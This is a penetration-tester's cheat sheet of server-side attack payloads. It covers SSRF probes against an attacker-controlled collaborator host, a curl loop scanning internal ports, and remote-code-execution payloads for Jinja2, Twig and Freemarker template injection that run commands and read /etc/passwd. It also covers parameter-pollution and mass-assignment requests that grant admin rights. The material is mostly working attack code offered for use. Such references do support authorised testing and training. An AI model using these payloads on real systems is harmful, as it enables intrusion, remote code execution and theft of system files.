# Server-side Attacks

Advanced server-side vulnerabilities — SSRF, SSTI, and server-side request abuse leading to information disclosure and RCE.

## SSRF

See [Web Attacks](../Web%20Attacks/) for full SSRF reference.

```bash
# Quick test: does server fetch external URLs?
url=http://attacker-burp-collaborator.com/test

# Internal port sweep
for port in 22 80 443 3306 5432 6379 8080 8443; do
  curl -s "http://target.com/fetch?url=http://127.0.0.1:$port" &
done
```

## SSTI (Server-Side Template Injection)

Detect by injecting math expressions — if result is computed, template engine is vulnerable.

```
# Detection probes
{{7*7}}           → 49 (Jinja2, Twig)
${7*7}            → 49 (Freemarker, Velocity, EL)
<%= 7*7 %>        → 49 (ERB - Ruby)
#{7*7}            → 49 (Ruby interpolation)
{{7*'7'}}         → 7777777 → Jinja2
{{7*'7'}}         → 49 → Twig
```

### Jinja2 RCE

```python
# Read file
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}

# Simpler if builtins available
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# From empty dict
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

### Twig RCE

```
{{['id']|filter('system')}}
{{'/etc/passwd'|file_excerpt(1,30)}}
```

### Freemarker RCE

```
${"freemarker.template.utility.Execute"?new()("id")}
```

## HTTP Parameter Pollution (HPP)

```
# Duplicate parameters — server behavior depends on framework
?id=1&id=2

# Django/Flask take first; PHP/ASP take last
# Exploit: bypass WAF rule that checks first param, backend uses second
```

## Mass Assignment

```json
# API accepts extra fields that map to internal model properties
PATCH /api/user/1
{"name": "John", "role": "admin"}   # if role is in model, may be accepted

# Or in registration
{"username":"john","password":"pass","isAdmin":true}
```
